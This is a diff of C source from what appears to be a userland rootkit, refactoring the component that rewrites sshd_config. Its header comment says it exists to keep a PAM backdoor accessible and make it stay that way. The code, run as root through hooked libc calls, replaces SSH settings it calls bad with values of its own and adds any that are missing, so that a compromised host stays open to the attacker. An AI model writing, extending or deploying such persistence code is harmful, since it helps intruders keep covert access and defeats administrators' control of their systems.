@@ -3,10 +3,39 @@
  *   to make sure the PAM backdoor is accessible, AND STAYS THAT WAY.
  */
 
+void addsetting(char *setting, char *value, char **buf){
+    // add "<Setting> <Desired value>\n"
+    char tmp[strlen(setting) + strlen(value) + 4];
+    memset(tmp, 0, sizeof(tmp));
+    snprintf(tmp, sizeof(tmp), "%s %s\n", setting, value);
+    strcat(*buf, tmp);
+}
+
+size_t writesshd(char *buf, int mode){
+    FILE *fp;
+    size_t count;
+    hook(CFOPEN, CFWRITE);
+
+    fp = call(CFOPEN, SSHD_CONFIG, "w");
+    if(fp == NULL) return -1;
+    count = (size_t)call(CFWRITE, buf, 1, strlen(buf), fp);
+    
+    fflush(fp);
+    fclose(fp);
+    return count;
+}
+
+/* this function reads sshd_config. if we can open it for reading, memory is allocated for it.
+ *
+ * each line is checked individually for bad settings.
+ * the integer array 'res' contains statuses for the following outcomes of target settings:
+ *   if a setting is spotted on the line & it is bad, the line is substituted for a more desireable setting of our own.
+ *   if a setting is spotted on the line & it is ok, nothing is done to it.
+ * if neither outcomes are met, it is assumed that the setting is missing & that we need to write in a new line for it ourselves. */
 int sshdok(int res[], char **buf, size_t *sshdsize){
     hook(CFOPEN, C__XSTAT);
 
-    /* first, get the size of the sshd_config file so we know how much memory to allocate. */
+    // stat sshd_config so we can get the filesize.
     struct stat sshdstat;
     memset(&sshdstat, 0, sizeof(struct stat));
     int statstat = (long)call(C__XSTAT, _STAT_VER, SSHD_CONFIG, &sshdstat);
@@ -22,15 +51,17 @@ int sshdok(int res[], char **buf, size_t *sshdsize){
     int skipline = 0;  // indicates whether or not to skip current line from file.
 
     fp = call(CFOPEN, SSHD_CONFIG, "r");
-    if(fp == NULL) return -1;
+    if(fp == NULL)
+        return -1;
 
     // file opened for reading ok. now allocate memory for it.
-    *sshdsize = sshdstat.st_size + 45; // +45 bytes for possible additions of our own...
+    *sshdsize = sshdstat.st_size;
 #ifdef MAX_SSHD_SIZE
     if(*sshdsize > MAX_SSHD_SIZE)
         *sshdsize = MAX_SSHD_SIZE;
 #endif
 
+    *sshdsize += 45; // +45 bytes for possible additions of our own...
     *buf = malloc(*sshdsize);
     memset(*buf, 0, *sshdsize);
     
@@ -39,8 +70,7 @@ int sshdok(int res[], char **buf, size_t *sshdsize){
         skipline = 0;
 
         for(int i = 0; i != sizeofarr(patchtargets); i++){
-            /* if we've already determined the status of a target setting, go next. */
-            if(res[i] == 2 || res[i] == 1)
+            if(res[i] == 2 || res[i] == 1) // status of setting already determined. next.
                 continue;
 
             /* curtarget is a specific setting within sshd_config
@@ -58,35 +88,22 @@ int sshdok(int res[], char **buf, size_t *sshdsize){
 
                 /* check current setting value against values we don't want. */
                 if(strstr(cursettingval, antival[i])){
-                    // tmp buffer for "<Setting> <Value we want instead>\n"
-                    char tmp[strlen(curtarget) + strlen(targetval[i]) + 3];
-                    memset(tmp, 0, sizeof(tmp));
-
-                    // create the line for the setting we want.
-                    snprintf(tmp, sizeof(tmp), "%s %s\n", curtarget, targetval[i]);
-                    strcat(*buf, tmp); // now add it into the sshd_config we have in memory.
-                    
-                    // indicates to skip adding the original line into memory as we have our own.
+                    addsetting(curtarget, targetval[i], buf);
                     skipline = 1;
                     res[i] = 2;
-
                     free(linedup);
                     break;
                 }
 
-                /* we've found the target setting for this line, but it's ok the way it is. */
-                res[i] = 1;
+                res[i] = 1;    // target setting is ok the way it is.
                 free(linedup);
                 break;
             }
-
-            continue;
         }
 
-        if(skipline)
+        if(skipline) // bad line. we dont want bad line.
             continue;
 
-        /* only copy the contents of line into memory if not skipping this line. */
         strcat(*buf, line);
     }
     fclose(fp);
@@ -103,8 +120,10 @@ void sshdpatch(int mode){
     if(not_user(0))
         return;
 
-    size_t sshdsize;
-    int status[sizeofarr(patchtargets)];
+    char *sshdcontents; // stores contents of sshd_config.
+    size_t sshdsize;    // stores filesize of sshd_config.
+    int status[sizeofarr(patchtargets)]; // stores patch status of each setting.
+
     if(sshdok(status, &sshdcontents, &sshdsize) < 0)
         return;
 
@@ -116,8 +135,6 @@ void sshdpatch(int mode){
     for(int i = 0; i != sizeofarr(status); i++){
         curstatus = status[i];
 
-        char tmp[strlen(patchtargets[i]) + strlen(targetval[i]) + 4];
-
         switch(curstatus){
             case 1: /* current target setting is ok. */
                 nook++;
@@ -126,10 +143,7 @@ void sshdpatch(int mode){
                 nopatched++;
                 break;
             default: /* target setting was missing. add it. */
-                memset(tmp, 0, sizeof(tmp));
-                // create & append setting line.
-                snprintf(tmp, sizeof(tmp), "\n%s %s\n", patchtargets[i], targetval[i]);
-                strcat(sshdcontents, tmp);
+                addsetting(patchtargets[i], targetval[i], &sshdcontents);
                 nomissing++;
                 break;
         }
@@ -141,30 +155,15 @@ void sshdpatch(int mode){
         printf("settings originally missing (now patched): %d\n", nomissing);
     }
 
-    /* no indications that any changes need to be made. */
-    if(nook == sizeofarr(patchtargets)){
-        if(mode == MAGIC_USR)
-            printf("no settings to patch...\n");
-        goto nothingdone;
-    }
+    if(nook != sizeofarr(patchtargets)){
+        size_t writecount = writesshd(sshdcontents, mode);
+        if(mode == MAGIC_USR){
+            if(writecount >= sshdsize)
+                printf("successfully patched sshd_config\n");
+            else if(!writecount)
+                printf("failed writing new sshd_config\n");
+        }
+    }else if(mode == MAGIC_USR) printf("no settings to patch...\n");
 
-    hook(CFOPEN);
-    FILE *fp = call(CFOPEN, SSHD_CONFIG, "w");
-    if(fp == NULL)
-        goto nothingdone;
-
-    size_t count = fwrite(sshdcontents, 1, strlen(sshdcontents), fp);
-    if(!count){
-        if(mode == MAGIC_USR)
-            printf("failed writing new sshd_config\n");
-    }else if(count >= sshdsize){
-        if(mode == MAGIC_USR)
-            printf("successfully patched sshd_config\n");
-    }
-
-    fflush(fp);
-    fclose(fp);
-
-nothingdone:
     free(sshdcontents);
 }
